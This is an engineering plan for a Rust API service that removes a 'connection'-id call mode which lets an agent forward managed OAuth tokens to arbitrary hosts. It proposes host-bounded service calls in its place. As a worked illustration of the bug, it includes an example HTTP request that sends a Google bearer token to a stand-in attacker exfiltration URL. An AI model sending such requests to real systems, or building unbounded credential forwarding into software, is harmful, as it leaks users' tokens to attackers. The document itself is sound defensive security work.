# Auth by Service Instance — Removing the `connection`-id call mode

**Status:** Done — single PR, Phases 2/4/5; Phase 1 (in-place security plug) and Phase 3 (deprecation window) dropped because the deleted code path goes away in the same PR and there are no external callers in-tree.

## TL;DR

`POST /v1/actions/call` currently accepts three shapes ("Mode A/B/C" in the
code). Of these, **Mode B** (`connection: <uuid>` + raw `url`) is an
implementation deviation from SPEC.md §8, lets an agent send a
managed-OAuth bearer to any host, and is redundant with what SPEC.md
already specifies as "Service + HTTP verb". This plan deletes Mode B and
brings the implementation into line with the spec.

## Why

### Current implementation (`crates/overslash-api/src/routes/actions.rs`)

| Code label | Caller supplies | Auth | Host bound |
|------------|-----------------|------|------------|
| Mode A | `method` + `url` (+ optional `secrets[]`) | none / inject named secret | none |
| Mode B | `connection: <uuid>` + raw `url` | refresh OAuth via that connection | **none** |
| Mode C | `service` + `action` + `params` | service-instance binding | `svc.hosts` from template |

### SPEC.md §8 (`POST /v1/actions/call`)

> All action execution goes through a single endpoint. The caller specifies
> a service instance and action — the level of abstraction is determined by
> what they choose:
>
> - **Service + defined action** — names a service instance and a
>   template-defined action. Derives key `github:create_pull_request:{resource}`.
> - **Service + HTTP verb** — names a service instance and an HTTP method +
>   path. Derives key `github:POST:/repos/X/pulls`.
> - **`http` pseudo-service** — full URL + method + headers + secret
>   injection metadata. Derives `http:POST:api.github.com` + `secret:…:host`.

Mode B has no entry here. Implementation Mode A is the SPEC's `http`
pseudo-service. Mode C is "Service + defined action". **"Service + HTTP
verb" is the SPEC-blessed replacement for Mode B and is currently
unimplemented**.

### The CRAZY bug (security)

In Mode B, `host(req.url)` is never validated against
`conn.provider_key`. An agent with a Google connection can:

```http
POST /v1/actions/call
{
  "connection": "<google-conn-uuid>",
  "method": "POST",
  "url": "https://attacker.example.com/exfil",
  "body": "..."
}
```

We dutifully refresh the Google access token and send it as
`Authorization: Bearer ya29...` to the attacker. The token is now usable
against `googleapis.com` for its remaining lifetime.

Mode C is safe because `host` comes from `svc.hosts`. The "Service + HTTP
verb" replacement inherits this guarantee.

## Goal

Implement SPEC.md §8 "Service + HTTP verb" and delete Mode B.

`service` (instance name) without `action` becomes a valid request shape,
accepting caller-supplied `method` + `path`:

```json
{
  "service": "google-default",
  "method": "GET",
  "path": "/customsearch/v1?q=…"
}
```

The instance's binding resolves auth (existing
`resolve_instance_auth`); `svc.hosts` bounds where the bearer can land;
the rest of the pipeline (`check_required_scopes`, ceiling, permission
walk, audit) is reused unchanged. Permission key follows the SPEC:
`{service_key}:{METHOD}:{path}`.

## Plan

### Phase 1 — Plug the CRAZY bug in place (security, atomic)

Even before the bigger refactor, kill the worst case:

- [ ] In `resolve_request`'s Mode B branch, validate `host(req.url)`
      against the connection's provider host allow-list.
  - Source: union of `svc.hosts` for every template using
    `provider == conn.provider_key`, OR a new `oauth_provider.allowed_hosts`
    column.
- [ ] Reject mismatched host with `400 host_not_allowed_for_provider`.
- [ ] Test: Mode B with a non-provider host → 400.

Self-contained; can ship before Phase 2 lands.

### Phase 2 — Implement "Service + HTTP verb" (SPEC §8)

- [ ] Extend `CallRequest`: `service` is allowed without `action`. In that
      shape, caller must supply `method` + (`path` or `url`).
- [ ] In `resolve_request`, before the existing Mode C
      `(service, action)` arm, add a `(service, no action)` arm that:
  - Resolves the service instance.
  - Validates `host` (from `path` → first of `svc.hosts`; from `url` →
    must match any of `svc.hosts`).
  - Resolves auth via `resolve_instance_auth`.
  - Returns `ActionRequest` + `ResolvedMeta` with `service_scope` set so
    permission keys derive as `{service_key}:{METHOD}:{path}` per SPEC.
- [ ] Update `PermissionKey::from_http` (or add `from_service_http`) to
      emit `{service}:{METHOD}:{path}` when a service context is present.
- [ ] Tests: free-form-under-service succeeds; rejects out-of-bounds
      host; permission keys match SPEC examples.

### Phase 3 — Deprecate Mode B in the protocol

- [ ] When `connection: <uuid>` is set, return:
      `400 { error: "mode_b_removed", hint: "Use 'service' instead; the
      instance binding provides auth." }`. Hold for one minor version.
- [ ] Update SDK + dashboard callers (search for `connection:` in
      request bodies in `dashboard/src` and `crates/oversla-sh`).

### Phase 4 — Remove Mode B code

- [ ] Delete the Mode B branch in `resolve_request` (~50 lines).
- [ ] Delete `connection: Option<Uuid>` from `CallRequest`.
- [ ] Delete the `"b"` arm in the `mode` metric label dispatcher.
- [ ] Drop the Mode-B paragraph from the module doc and from
      `CallRequest`'s doc comment.
- [ ] Migrate tests: grep `"connection":` in `crates/overslash-api/tests/`
      (notably `oauth_x.rs`, `whatsapp.rs`, `actions_validate.rs`).

### Phase 5 — SPEC + DECISIONS update

- [ ] **`SPEC.md` §8** — add one paragraph explicitly noting that direct
      `connection: <uuid>` requests are not supported; free-form authed
      calls go through "Service + HTTP verb". (The three documented
      shapes already cover the legitimate use cases.)
- [ ] **`DECISIONS.md`** — new entry:

      > **D-NN — `connection: <uuid>` action calls removed.**
      > Free-form authed calls now require a service-instance context, so
      > the template's `hosts[]` bounds where the bearer can land. Without
      > the bound, an agent could exfiltrate a managed OAuth token to an
      > arbitrary URL. Reason: closes the host-binding gap; aligns with
      > SPEC §8 (Service + HTTP verb).

- [ ] **`STATUS.md`** — mark "Service + HTTP verb" shipped once Phase 2
      lands; mark Mode B removed once Phase 4 lands.
- [ ] **`UI_SPEC.md` / API Explorer** — confirm the developer connection
      tool builds free-form requests via `service: <instance>` (per
      SPEC §15), not raw connection IDs. Update if any code in
      `dashboard/src/routes/explorer/` still synthesises `connection`.
- [ ] **`TECH_DEBT.md`** — drop any item referencing Mode B as a known
      gap (none today, but check before closing the branch).

## Open questions

### O1 — Mode A `secrets[]` shape (related, deferred)

Mode A still allows
`secrets: [{ name, inject_as: header, header_name: "Authorization" }]` against
any URL. Same exfiltration class as the CRAZY bug, lower likelihood
(requires the agent to know the secret name AND have permission to inject
it).

Options:
- **A1** — Restrict `secrets[]` to admin callers in Mode A.
- **A2** — Require `service:` whenever `secrets[]` is non-empty (forces
  host bound). Strictly stronger.
- **A3** — Status quo, tackle later.

**Recommendation**: A2 is the conceptual end-state ("any credential
injection requires a service-instance context"). Out of scope for this
refactor; track as a follow-up.

### O2 — `path` vs `url` shape

Should "Service + HTTP verb" accept `path` (just the path), `url` (full),
or both?

**Recommendation**: accept both.
- `path: "/x"` — prefix the first host from `svc.hosts`.
- `url: "https://h/x"` — host must match any of `svc.hosts`.

### O3 — Multi-host services

Templates can list multiple hosts. With `path` shape, we pick the first;
with `url` shape, any host in the list is accepted. Document both.

### O4 — Permission-key arg shape

SPEC §8 example uses `github:POST:/repos/X/pulls` (path as arg). The
implementation's `from_http` uses `http:METHOD:host/path`. For
"Service + HTTP verb" we should follow SPEC: `{service}:{METHOD}:{path}`
(no host, since service constrains the host). Affects existing remember
rules — none today, but worth noting.

## Inline NOTEs in `crates/overslash-api/src/routes/actions.rs`

The file carries eight inline `NOTE:` / `CRAZY:` / `Node:` markers added
during review. Quick map:

| Line | Marker | Disposition |
|------|--------|-------------|
| L514 | `NOTE: filter validate_syntax ordering` | Keep ordering (input-malformed 400 before perms 403). No change. |
| L1605 | `Node: Mode B as header injector` | **This refactor.** Phase 2 subsumes. |
| L1610 | `NOTE: parse hex key cached on AppState` | Mechanical: parse once at startup into a `SecretsKey` newtype on `AppState`. Do alongside Phase 4. |
| L1613 | `CRAZY: cross-service credential injection` | **Phase 1** plugs; **Phase 4** removes the surface. |
| L1615 | `NOTE: long path, use crate::services::client_credentials` | Trivial; ship with Phase 4. |
| L1616 | `NOTE: resolve() should access enc key inside` | Depends on `SecretsKey` (L1610). |
| L1628 | `NOTE: same as resolve()` | Same as L1616. |
| L1629 | `NOTE: merge resolve + oauth::resolve_access_token` | Every call site of one is followed immediately by the other. Collapse into `resolve_bearer(&state, &scope, &conn) -> String`. ~75 lines saved across the codebase. Do alongside Phase 4. |

## Broader refactors (deferred, not blocked by this work)

These showed up while reading `actions.rs` but are independent of Mode B
removal. In rough priority order:

1. **`SecretsKey` newtype on `AppState`** — see L1610. Mechanical.
2. **Collapse `client_credentials::resolve` + `oauth::resolve_access_token`**
   into one `resolve_bearer` helper — see L1629.
3. **Replace `ResolvedMeta` struct of `Option`s with an enum**
   (`Resolved::RawHttp | ::Service { instance_owner, scope, risk }`) —
   fixes a class of "did I forget to populate this Option" bugs.
4. **Hoist the approval-creation block out of `call_action`** — currently
   ~90 inlined lines of "build approval row → audit → webhook → respond".
5. **Hoist `resolve_instance_auth`'s 3× duplicated
   `enc_key.match → fall back to resolve_service_auth`** — collapses with
   `?` once the key parses at startup.
6. **Layer 1 + Layer 2 into one decision module** — ceiling check + chain
   walk are conceptually one decision split across ~120 inlined lines.

## Sequencing recommendation for the next agent

1. **Phase 1** alone, as a small PR. Security fix, low risk, can ship now.
2. **Phase 2** as a feature PR. Largest single chunk; needs design pass on
   `path` vs `url` and tests.
3. **Phase 5 (SPEC/DECISIONS)** as a docs-only PR alongside Phase 2.
4. **Phase 3 + Phase 4** as one removal PR after a release window.
5. The `SecretsKey` and `resolve_bearer` mechanical refactors (L1610,
   L1629) bundled with Phase 4, since the call sites disappear at the
   same time.

## References

- `crates/overslash-api/src/routes/actions.rs` — main file (this branch
  has the inline NOTE markers).
- `crates/overslash-api/src/services/oauth.rs::resolve_access_token`
- `crates/overslash-api/src/services/client_credentials.rs::resolve`
- `crates/overslash-api/src/services/permission_chain.rs` — chain walk.
- `crates/overslash-core/src/permissions.rs::PermissionKey::from_http`
  (and the `from_service_action` companion that "Service + HTTP verb"
  will join).
- `SPEC.md` §5 (permission keys), §8 (action execution).
- `DECISIONS.md` — pending entry for Phase 5.
